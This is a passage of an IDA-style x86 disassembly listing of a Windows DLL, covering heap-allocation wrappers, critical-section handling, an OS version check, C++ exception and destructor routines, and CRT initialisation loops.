					; sub_6AF5215E+1CDj ...
		mov	eax, [ebp+Arguments]
		mov	[eax], ebx

loc_6AF5237D:				; CODE XREF: sub_6AF5215E+D4j
		mov	eax, dword_6AF68280
		test	eax, eax
		jz	short loc_6AF52398
		and	[ebp+var_24], 0
		lea	ecx, [ebp+var_44]
		push	ecx
		push	5
		mov	[ebp+var_2C], edi
		mov	[ebp+var_28], ebx
		call	eax ; dword_6AF68280

loc_6AF52398:				; CODE XREF: sub_6AF5215E+226j
		mov	eax, ebx

loc_6AF5239A:				; CODE XREF: sub_6AF5215E+7Fj
					; sub_6AF5215E+144j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_6AF5215E	endp

; [00000025 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; [00000005 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_6AF53757

loc_6AF523CB:				; CODE XREF: sub_6AF53757-1306j
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF523DE
		push	eax		; Memory
		call	free
		and	dword ptr [esi], 0
		pop	ecx

loc_6AF523DE:				; CODE XREF: sub_6AF53757-1385j
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		pop	esi
		retn
; END OF FUNCTION CHUNK	FOR sub_6AF53757

; =============== S U B	R O U T	I N E =======================================


sub_6AF523E8	proc near		; CODE XREF: sub_6AF52456+34p

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		test	eax, eax
		jl	short loc_6AF523FD
		cmp	eax, [ecx+4]
		jge	short loc_6AF523FD
		mov	ecx, [ecx]
		lea	eax, [ecx+eax*4]
		retn	4
; ---------------------------------------------------------------------------

loc_6AF523FD:				; CODE XREF: sub_6AF523E8+6j
					; sub_6AF523E8+Bj
		push	0		; lpArguments
		push	0		; nNumberOfArguments
		push	1		; dwExceptionFlags
		push	0C000008Ch	; dwExceptionCode
		call	ds:RaiseException
		int	3		; Trap to Debugger
sub_6AF523E8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_6AF5240F	proc near		; CODE XREF: sub_6AF52456+42p
		push	esi
		mov	esi, ecx
		cmp	byte ptr [esi+4], 0
		jz	short loc_6AF52424
		push	dword ptr [esi]	; lpCriticalSection
		call	ds:LeaveCriticalSection
		mov	byte ptr [esi+4], 0

loc_6AF52424:				; CODE XREF: sub_6AF5240F+7j
		pop	esi
		retn
sub_6AF5240F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52426	proc near		; CODE XREF: sub_6AF524A4+16p
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]	; Dst
		call	sub_6AF31125
		xor	eax, eax
		mov	[esi+30h], eax
		mov	[esi+34h], eax
		mov	[esi+38h], eax
		mov	eax, esi
		pop	esi
		retn
sub_6AF52426	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_6AF53757

loc_6AF52440:				; CODE XREF: sub_6AF53757+5j
		push	esi
		mov	esi, ecx
		lea	eax, [esi+18h]
		push	eax		; lpCriticalSection
		call	ds:DeleteCriticalSection
		lea	ecx, [esi+30h]
		pop	esi
		jmp	loc_6AF523CB
; END OF FUNCTION CHUNK	FOR sub_6AF53757

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF52456	proc near		; CODE XREF: sub_6AF3151B+Cp
					; sub_6AF3151B+2Ep

var_8		= dword	ptr -8
var_4		= byte ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, ecx
		lea	eax, [esi+18h]
		push	eax		; lpCriticalSection
		mov	[ebp+var_8], eax
		call	ds:EnterCriticalSection
		mov	eax, [esi+34h]
		mov	ecx, [ebp+arg_0]
		cmp	ecx, eax
		mov	[ebp+var_4], 1
		jg	short loc_6AF52493
		test	ecx, ecx
		jl	short loc_6AF52493
		cmp	ecx, eax
		jnz	short loc_6AF52486
		mov	esi, [esi+8]
		jmp	short loc_6AF52495
; ---------------------------------------------------------------------------

loc_6AF52486:				; CODE XREF: sub_6AF52456+29j
		push	ecx
		lea	ecx, [esi+30h]
		call	sub_6AF523E8
		mov	esi, [eax]
		jmp	short loc_6AF52495
; ---------------------------------------------------------------------------

loc_6AF52493:				; CODE XREF: sub_6AF52456+21j
					; sub_6AF52456+25j
		xor	esi, esi

loc_6AF52495:				; CODE XREF: sub_6AF52456+2Ej
					; sub_6AF52456+3Bj
		lea	ecx, [ebp+var_8]
		call	sub_6AF5240F
		mov	eax, esi
		pop	esi
		leave
		retn	4
sub_6AF52456	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=78h

sub_6AF524A4	proc near		; CODE XREF: sub_6AF536F4+5p

Dst		= dword	ptr -98h
var_94		= dword	ptr -94h
var_90		= dword	ptr -90h
var_88		= dword	ptr -88h
var_4		= dword	ptr -4

		push	ebp
		lea	ebp, [esp-78h]
		sub	esp, 98h
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+78h+var_4], eax
		mov	esi, ecx
		call	sub_6AF52426
		mov	eax, offset __ImageBase
		push	94h		; Size
		mov	[esi+8], eax
		mov	[esi+4], eax
		lea	eax, [ebp+78h+Dst]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [esi], 3Ch
		mov	byte ptr [esi+0Ch], 0
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+78h+Dst]
		push	eax		; lpVersionInformation
		mov	[ebp+78h+Dst], 94h
		call	ds:GetVersionExA
		cmp	[ebp+78h+var_88], 2
		jnz	short loc_6AF52506
		cmp	[ebp+78h+var_94], 5
		jb	short loc_6AF5251E
		jmp	short loc_6AF5251A
; ---------------------------------------------------------------------------

loc_6AF52506:				; CODE XREF: sub_6AF524A4+58j
		cmp	[ebp+78h+var_88], 1
		jnz	short loc_6AF5251E
		cmp	[ebp+78h+var_94], 4
		ja	short loc_6AF5251A
		jnz	short loc_6AF5251E
		cmp	[ebp+78h+var_90], 0
		jbe	short loc_6AF5251E

loc_6AF5251A:				; CODE XREF: sub_6AF524A4+60j
					; sub_6AF524A4+6Cj
		mov	byte ptr [esi+0Ch], 1

loc_6AF5251E:				; CODE XREF: sub_6AF524A4+5Ej
					; sub_6AF524A4+66j ...
		lea	ecx, [esi+18h]
		mov	dword ptr [esi+10h], 710h
		mov	dword ptr [esi+14h], offset dword_6AF61A00
		call	sub_6AF31139
		test	eax, eax
		jge	short loc_6AF5253F
		mov	byte_6AF68250, 1

loc_6AF5253F:				; CODE XREF: sub_6AF524A4+92j
		mov	ecx, [ebp+78h+var_4]
		mov	eax, esi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 78h
		leave
		retn
sub_6AF524A4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5254F	proc near		; CODE XREF: sub_6AF525CA+3p
					; sub_6AF53761+5j
		cmp	byte ptr [ecx+8], 0
		mov	dword ptr [ecx], offset	off_6AF61A10
		jz	short locret_6AF52569
		mov	ecx, [ecx+4]
		test	ecx, ecx
		jz	short locret_6AF52569
		push	ecx		; hHeap
		call	ds:HeapDestroy

locret_6AF52569:			; CODE XREF: sub_6AF5254F+Aj
					; sub_6AF5254F+11j
		retn
sub_6AF5254F	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF5256A(SIZE_T dwBytes)
sub_6AF5256A	proc near		; DATA XREF: .rdata:off_6AF61A10o

dwBytes		= dword	ptr  4

		push	[esp+dwBytes]	; dwBytes
		push	0		; dwFlags
		push	dword ptr [ecx+4] ; hHeap
		call	ds:HeapAlloc
		retn	4
sub_6AF5256A	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF5257C(LPVOID lpMem)
sub_6AF5257C	proc near		; DATA XREF: .rdata:6AF61A14o

lpMem		= dword	ptr  4

		cmp	[esp+lpMem], 0
		jz	short locret_6AF52592
		push	[esp+lpMem]	; lpMem
		push	0		; dwFlags
		push	dword ptr [ecx+4] ; hHeap
		call	ds:HeapFree

locret_6AF52592:			; CODE XREF: sub_6AF5257C+5j
		retn	4
sub_6AF5257C	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF52595(LPVOID lpMem, int)
sub_6AF52595	proc near		; DATA XREF: .rdata:6AF61A18o

lpMem		= dword	ptr  4
arg_4		= dword	ptr  8

		cmp	[esp+lpMem], 0
		push	[esp+arg_4]
		jnz	short loc_6AF525A6
		mov	eax, [ecx]
		call	dword ptr [eax]
		jmp	short locret_6AF525B5
; ---------------------------------------------------------------------------

loc_6AF525A6:				; CODE XREF: sub_6AF52595+9j
		push	[esp+4+lpMem]	; lpMem
		push	0		; dwFlags
		push	dword ptr [ecx+4] ; hHeap
		call	ds:HeapReAlloc

locret_6AF525B5:			; CODE XREF: sub_6AF52595+Fj
		retn	8
sub_6AF52595	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF525B8(LPCVOID lpMem)
sub_6AF525B8	proc near		; DATA XREF: .rdata:6AF61A1Co

lpMem		= dword	ptr  4

		push	[esp+lpMem]	; lpMem
		push	0		; dwFlags
		push	dword ptr [ecx+4] ; hHeap
		call	ds:HeapSize
		retn	4
sub_6AF525B8	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF525CA(void *, char)
sub_6AF525CA	proc near		; DATA XREF: .rdata:6AF61A20o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF5254F
		test	[esp+4+arg_0], 1
		jz	short loc_6AF525E0
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF525E0:				; CODE XREF: sub_6AF525CA+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF525CA	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF525E6	proc near		; CODE XREF: sub_6AF53732+Ap

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		mov	[eax+4], ecx
		mov	dword ptr [eax], offset	off_6AF61A24
		xor	ecx, ecx
		mov	[eax+8], ecx
		mov	dword ptr [eax+14h], 2
		mov	[eax+0Ch], ecx
		mov	[eax+10h], ecx
		mov	[eax+18h], cx
		mov	[eax+1Ah], cx
		mov	[eax+8], eax
		retn	4
sub_6AF525E6	endp

; [00000008 BYTES: COLLAPSED FUNCTION Concurrency::details::EventWaitNode::Reset(void).	PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5261D	proc near		; DATA XREF: .rdata:6AF61A30o
		xor	edx, edx
		lea	eax, [ecx+14h]
		inc	edx
		lock xadd [eax], edx
		lea	eax, [ecx+8]
		retn
sub_6AF5261D	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5262B	proc near		; DATA XREF: .rdata:6AF61A34o
		mov	eax, ecx
		retn
sub_6AF5262B	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_14. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5264B	proc near		; DATA XREF: .rdata:off_6AF61A24o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		add	esi, 8
		and	esi, 0FFFFFFF8h
		mov	edx, esi
		imul	edx, [esp+4+arg_4]
		push	edi
		mov	edi, ecx
		mov	ecx, [edi+4]
		mov	eax, [ecx]
		add	edx, 10h
		push	edx
		call	dword ptr [eax]
		test	eax, eax
		jz	short loc_6AF52680
		dec	esi
		and	dword ptr [eax+4], 0
		mov	[eax], edi
		mov	dword ptr [eax+0Ch], 1
		mov	[eax+8], esi

loc_6AF52680:				; CODE XREF: sub_6AF5264B+22j
		pop	edi
		pop	esi
		retn	8
sub_6AF5264B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52685	proc near		; DATA XREF: .rdata:6AF61A2Co

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	ecx, [ecx+4]
		mov	eax, [ecx]
		push	esi
		mov	esi, [esp+4+arg_4]
		add	esi, 8
		and	esi, 0FFFFFFF8h
		mov	edx, esi
		imul	edx, [esp+4+arg_8]
		add	edx, 10h
		push	edx
		push	[esp+8+arg_0]
		call	dword ptr [eax+8]
		test	eax, eax
		jz	short loc_6AF526AF
		dec	esi
		mov	[eax+8], esi

loc_6AF526AF:				; CODE XREF: sub_6AF52685+24j
		pop	esi
		retn	0Ch
sub_6AF52685	endp

; [00000026 BYTES: COLLAPSED FUNCTION __onexit.	PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _atexit. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION malloc. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION free. PRESS KEYPAD "+" TO	EXPAND]
; [0000003B BYTES: COLLAPSED FUNCTION __SEH_prolog. PRESS KEYPAD "+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __SEH_epilog. PRESS KEYPAD "+" TO	EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _except_handler3.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [0000003D BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
; [00000030 BYTES: COLLAPSED FUNCTION _report_failure. PRESS KEYPAD "+"	TO EXPAND]
		align 2
; [0000000E BYTES: COLLAPSED FUNCTION unknown_libname_15. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF527CC(void *, char)
sub_6AF527CC	proc near		; DATA XREF: .rdata:off_6AF61A50o

arg_0		= byte ptr  4

		push	ebx
		mov	bl, [esp+4+arg_0]
		test	bl, 2
		push	esi
		mov	esi, ecx
		jz	short loc_6AF527FD
		push	edi
		push	offset ??1type_info@@UAE@XZ ; void (__thiscall *)(void *)
		lea	edi, [esi-4]
		push	dword ptr [edi]	; int
		push	0Ch		; unsigned int
		push	esi		; void *
		call	unknown_libname_17 ; Microsoft VisualC 2-10/net	runtime
		test	bl, 1
		jz	short loc_6AF527F8
		push	edi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF527F8:				; CODE XREF: sub_6AF527CC+23j
		mov	eax, edi
		pop	edi
		jmp	short loc_6AF52812
; ---------------------------------------------------------------------------

loc_6AF527FD:				; CODE XREF: sub_6AF527CC+Bj
		mov	ecx, esi	; void *
		call	??1type_info@@UAE@XZ ; type_info::~type_info(void)
		test	bl, 1
		jz	short loc_6AF52810
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF52810:				; CODE XREF: sub_6AF527CC+3Bj
		mov	eax, esi

loc_6AF52812:				; CODE XREF: sub_6AF527CC+2Fj
		pop	esi
		pop	ebx
		retn	4
sub_6AF527CC	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION _CxxThrowException. PRESS	KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
; [00000006 BYTES: COLLAPSED CHUNK OF FUNCTION unknown_libname_19. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [0000001F BYTES: COLLAPSED FUNCTION __EH_prolog. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION strlen. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION exception::exception(exception const &). PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _purecall. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION strcpy. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memcmp. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION exception::what(void). PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION operator delete[](void *). PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION __security_error_handler.	PRESS KEYPAD "+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __ArrayUnwind(void *,uint,int,void (*)(void *)). PRESS KEYPAD "+"	TO EXPAND]
; ---------------------------------------------------------------------------
; [00000006 BYTES: COLLAPSED CHUNK OF FUNCTION __ArrayUnwind(void *,uint,int,void (*)(void *)).	PRESS KEYPAD "+" TO EXPAND]
; [00000060 BYTES: COLLAPSED FUNCTION unknown_libname_17. PRESS	KEYPAD "+" TO EXPAND]
; [00000062 BYTES: COLLAPSED FUNCTION unknown_libname_18. PRESS	KEYPAD "+" TO EXPAND]
; [000000BE BYTES: COLLAPSED FUNCTION _CRT_INIT(x,x,x).	PRESS KEYPAD "+" TO EXPAND]
; [000000E4 BYTES: COLLAPSED FUNCTION DllEntryPoint. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _callnewh. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION __dllonexit. PRESS KEYPAD	"+" TO EXPAND]
; [00000066 BYTES: COLLAPSED FUNCTION ___security_init_cookie. PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION type_info::~type_info(void). PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION terminate(void). PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF52BD2	proc near		; CODE XREF: _CRT_INIT(x,x,x)+4Fp

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF61A98
		call	__SEH_prolog
		mov	[ebp+var_1C], offset dword_6AF61D9C

loc_6AF52BE5:				; CODE XREF: sub_6AF52BD2+3Cj
		cmp	[ebp+var_1C], offset dword_6AF61D9C
		jnb	short loc_6AF52C10
		and	[ebp+ms_exc.disabled], 0
		mov	eax, [ebp+var_1C]
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_6AF52C06
		call	eax
		jmp	short loc_6AF52C06
; ---------------------------------------------------------------------------

loc_6AF52BFF:				; DATA XREF: .rdata:stru_6AF61A98o
		xor	eax, eax	; Exception filter 0 for function 6AF52BD2
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF52C03:				; DATA XREF: .rdata:stru_6AF61A98o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF52BD2

loc_6AF52C06:				; CODE XREF: sub_6AF52BD2+27j
					; sub_6AF52BD2+2Bj
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		add	[ebp+var_1C], 4
		jmp	short loc_6AF52BE5
; ---------------------------------------------------------------------------

loc_6AF52C10:				; CODE XREF: sub_6AF52BD2+1Aj
		call	__SEH_epilog
		retn
sub_6AF52BD2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void __cdecl sub_6AF52C16()
sub_6AF52C16	proc near		; DATA XREF: _CRT_INIT(x,x,x)+54o

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF61AA8
		call	__SEH_prolog
		mov	[ebp+var_1C], offset dword_6AF61DA4

loc_6AF52C29:				; CODE XREF: sub_6AF52C16+3Cj
		cmp	[ebp+var_1C], offset dword_6AF61DA4
		jnb	short loc_6AF52C54
		and	[ebp+ms_exc.disabled], 0
		mov	eax, [ebp+var_1C]
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_6AF52C4A
		call	eax
		jmp	short loc_6AF52C4A
; ---------------------------------------------------------------------------

loc_6AF52C43:				; DATA XREF: .rdata:stru_6AF61AA8o
		xor	eax, eax	; Exception filter 0 for function 6AF52C16
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF52C47:				; DATA XREF: .rdata:stru_6AF61AA8o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF52C16

loc_6AF52C4A:				; CODE XREF: sub_6AF52C16+27j
					; sub_6AF52C16+2Bj
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		add	[ebp+var_1C], 4
		jmp	short loc_6AF52C29
; ---------------------------------------------------------------------------

loc_6AF52C54:				; CODE XREF: sub_6AF52C16+1Aj
		call	__SEH_epilog
		retn
sub_6AF52C16	endp

; [00000006 BYTES: COLLAPSED FUNCTION __CppXcptFilter. PRESS KEYPAD "+"	TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_6AF52C60	proc near		; CODE XREF: sub_6AF3A221+18p
					; Ordinal444+46p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	0
		push	eax
		call	off_6AF68160
sub_6AF52C60	endp

; ---------------------------------------------------------------------------
		retn	4

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_6AF52C70	proc near		; CODE XREF: sub_6AF52C60+7p
					; DATA XREF: .data:off_6AF68160o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		sub	esp, 10h
		mov	eax, [esp+10h+arg_0]
		mov	ecx, [esp+10h+arg_4]
		push	offset dword_6AF645C8
		lea	edx, [esp+14h+var_10]
		push	edx
		mov	[esp+18h+var_10], offset off_6AF61AB8
		mov	[esp+18h+var_C], eax
		mov	[esp+18h+var_8], ecx
		mov	[esp+18h+var_4], 0
		call	_CxxThrowException
sub_6AF52C70	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_6AF52CB0	proc near		; DATA XREF: .rdata:6AF645BCo

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF61AB8
		mov	ecx, [eax+4]
		mov	[esi+4], ecx
		mov	edx, [eax+8]
		mov	eax, edx
		test	eax, eax
		mov	[esi+8], edx
		mov	dword ptr [esi+0Ch], 0
		jz	short loc_6AF52CDC
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+4]

loc_6AF52CDC:				; CODE XREF: sub_6AF52CB0+24j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF52CB0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_6AF52CF0	proc near		; DATA XREF: .rdata:6AF645CCo
		push	esi
		mov	esi, ecx
		mov	eax, [esi+8]
		test	eax, eax
		mov	dword ptr [esi], offset	off_6AF61AB8
		jz	short loc_6AF52D06
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF52D06:				; CODE XREF: sub_6AF52CF0+Ej
		mov	esi, [esi+0Ch]
		test	esi, esi
		jz	short loc_6AF52D14
		push	esi		; hMem
		call	ds:LocalFree

loc_6AF52D14:				; CODE XREF: sub_6AF52CF0+1Bj
		pop	esi
		retn
sub_6AF52CF0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF52D20(void *, char)
sub_6AF52D20	proc near		; DATA XREF: .rdata:off_6AF61AB8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi+8]
		test	eax, eax
		mov	dword ptr [esi], offset	off_6AF61AB8
		jz	short loc_6AF52D36
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF52D36:				; CODE XREF: sub_6AF52D20+Ej
		mov	eax, [esi+0Ch]
		test	eax, eax
		jz	short loc_6AF52D44
		push	eax		; hMem
		call	ds:LocalFree

loc_6AF52D44:				; CODE XREF: sub_6AF52D20+1Bj
		test	[esp+4+arg_0], 1
		jz	short loc_6AF52D54
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4

loc_6AF52D54:				; CODE XREF: sub_6AF52D20+29j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF52D20	endp

; [00000006 BYTES: COLLAPSED FUNCTION VerQueryValueA. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION GetFileVersionInfoA. PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION GetFileVersionInfoSizeA. PRESS KEYPAD "+"	TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52D6C	proc near		; DATA XREF: .rdata:6AF61DE8o
		push	dword ptr [ebp-14h]
		push	dword ptr [ebp-18h]
		call	Ordinal1162
		pop	ecx
		pop	ecx
		retn
sub_6AF52D6C	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_19. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52D84	proc near		; DATA XREF: .rdata:stru_6AF61EA8o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF52D84	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_20. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52D97	proc near		; DATA XREF: .rdata:stru_6AF61ECCo
		mov	ecx, [ebp-10h]
		jmp	ds:??1exception@@UAE@XZ	; exception::~exception(void)
sub_6AF52D97	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_21. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52DAA	proc near		; DATA XREF: .rdata:stru_6AF61F2Co
		lea	ecx, [ebp-2Ch]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF52DAA	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_22. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52DBD	proc near		; DATA XREF: .rdata:6AF61F54o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF52DBD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52DC5	proc near		; DATA XREF: .rdata:6AF61F5Co
		lea	ecx, [ebp-94h]
		jmp	Ordinal1164
sub_6AF52DC5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52DD0	proc near		; DATA XREF: .rdata:6AF61F64o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52DD0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_23. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52DE2	proc near		; DATA XREF: .rdata:6AF61FCCo
		lea	ecx, [ebp-44h]
		jmp	Ordinal752
sub_6AF52DE2	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_24. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52DF4	proc near		; DATA XREF: .rdata:stru_6AF62030o
		mov	ecx, [ebp-10h]
		jmp	sub_6AF3789B
sub_6AF52DF4	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_25. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52E06	proc near		; DATA XREF: .rdata:stru_6AF62054o
		lea	ecx, [ebp-14h]
		jmp	sub_6AF317EB
sub_6AF52E06	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_26. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52E18	proc near		; DATA XREF: .rdata:6AF6207Co
		lea	ecx, [ebp-138h]
		jmp	sub_6AF3789B
sub_6AF52E18	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52E23	proc near		; DATA XREF: .rdata:6AF62084o
		lea	ecx, [ebp-13Ch]
		jmp	sub_6AF3789B
sub_6AF52E23	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52E2E	proc near		; DATA XREF: .rdata:6AF6208Co
		lea	ecx, [ebp-134h]
		jmp	Ordinal990
sub_6AF52E2E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52E39	proc near		; DATA XREF: .rdata:6AF62094o
		lea	ecx, [ebp-150h]
		jmp	Ordinal990
sub_6AF52E39	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52E44	proc near		; DATA XREF: .rdata:6AF6209Co
		lea	ecx, [ebp-178h]
		jmp	Ordinal752
sub_6AF52E44	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52E4F	proc near		; DATA XREF: .rdata:6AF620ACo
		lea	ecx, [ebp-140h]
